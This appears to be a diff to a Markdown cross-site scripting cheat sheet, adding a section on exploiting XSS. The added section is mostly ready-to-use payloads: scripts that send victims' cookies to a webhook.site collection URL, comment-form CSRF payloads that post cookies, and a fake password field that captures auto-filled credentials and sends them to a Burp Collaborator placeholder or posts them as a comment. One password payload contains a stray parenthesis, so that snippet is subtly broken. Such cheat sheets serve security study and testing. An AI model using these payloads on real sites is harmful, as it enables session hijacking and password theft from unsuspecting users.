@@ -31,6 +31,9 @@ Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in
 
 ### Exploiting XSS
 
+- [Steal cookie](#exploiting-cross-site-scripting-to-steal-cookies)
+- [capture password](#exploiting-cross-site-scripting-to-capture-passwords)
+
 ### Others
 - [Prevent XSS attack](#prevent-xss)
 
@@ -353,6 +356,90 @@ This can allow us to use this type of payload:
 
 ```js
 `${alert(document.domain)}`
+```
+
+## Exploiting cross-site scripting vulnerabilities
+
+### Exploiting cross-site scripting to steal cookies
+
+Most web applications use cookies for session handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.
+
+#### Limitation
+
+- The victim might not be logged in.
+- Many applications hide their cookies from JavaScript using the HttpOnly flag.
+- Sessions might be locked to additional factors like the user's IP address.
+- The session might time out before you're able to hijack it.
+
+#### Exploit
+
+Example of  collecting cookie data with webhooking:
+
+```html
+<script>document.location='https://webhook.site/b29c64ea-5fbc-4ba0-9b29-b5eb079a2e3a?c=' + document.cookie</script>
+
+<script>
+fetch('https://webhook.site/b29c64ea-5fbc-4ba0-9b29-b5eb079a2e3a', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+
+CSRF way to write cookie in the comment section:
+
+```html
+<script>
+    window.addEventListener('DOMContentLoaded', function(){
+        var token = document.getElementsByName("csrf")[0].value;
+        var data = new FormData();
+        data.append('csrf', token);
+        data.append('postId', 3);
+        data.append('comment', document.cookie);
+        data.append('name', 'victime');
+        data.append('email', 'get@gmail.com');
+        fetch('/post/comment',{
+            method: 'POST',
+            mode: 'no-cors',
+            body: data
+        });
+    });
+</script>
+```
+
+### Exploiting cross-site scripting to capture passwords
+
+These days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain.
+
+```HTML
+<input name='username' id='username'>
+<input type= 'password' name='password' onchange="
+if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value)
+});">
+```
+
+CSRF way to write the password + username in the comment section:
+
+```HTML
+<input name='username' id='username'>
+<input type= 'password' name='password' onchange="
+    var token = document.getElementsByName('csrf')[0].value;
+    var data = new FormData();
+    var user = document.getElementsByName('username')[0].value
+    data.append('csrf', token);
+    data.append('postId', 3);
+    data.append('comment', user+'~'+this.value);
+    data.append('name', 'victime');
+    data.append('email', 'get@gmail.com');
+    fetch('/post/comment',{
+        method: 'POST',
+        mode: 'no-cors',
+        body: data
+});">
 ```
 
 ## Prevent XSS
